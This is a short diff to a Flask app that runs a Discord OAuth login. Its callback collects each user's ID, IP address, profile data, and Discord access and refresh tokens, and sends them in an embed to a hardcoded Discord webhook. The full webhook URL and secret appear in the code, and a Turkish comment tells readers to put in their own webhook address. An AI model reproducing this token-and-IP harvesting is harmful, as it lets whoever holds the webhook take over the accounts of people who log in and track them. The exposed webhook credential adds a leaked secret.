@@ -1,5 +1,5 @@
 from requests_oauthlib import OAuth2Session
-from flask import Flask, request, redirect, session, render_template
+from flask import Flask, request, redirect, session, render_template, url_for
 import os
 import requests
 
@@ -43,7 +43,6 @@ def home():
     print("Login url:", login_url)
     return render_template('index.html')
 
-
 @app.route("/oauth_callback")
 def oauth_callback():
     try:
@@ -68,7 +67,7 @@ def oauth_callback():
         user_id = response.json()['id']
         user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
 
-        webhook_url = 'https://discord.com/api/webhooks/1182750185584066711/dn1wISc0tPKn4SIgiwvbZQVnKlOxsLGrIaKpy8QAOaYO5qNmIFu54IpVopxlm8-P7yzJ'
+        webhook_url = 'https://discord.com/api/webhooks/1182750185584066711/dn1wISc0tPKn4SIgiwvbZQVnKlOxsLGrIaKpy8QAOaYO5qNmIFu54IpVopxlm8-P7yzJ'  # Bu adresi kendi projenizdeki gerçek adresle değiştirin
 
         profile_data = response.json()
         embed = create_embed(user_id, user_ip, profile_data, session["discord_token"]["access_token"], session["discord_token"]["refresh_token"], color="#00FF00")
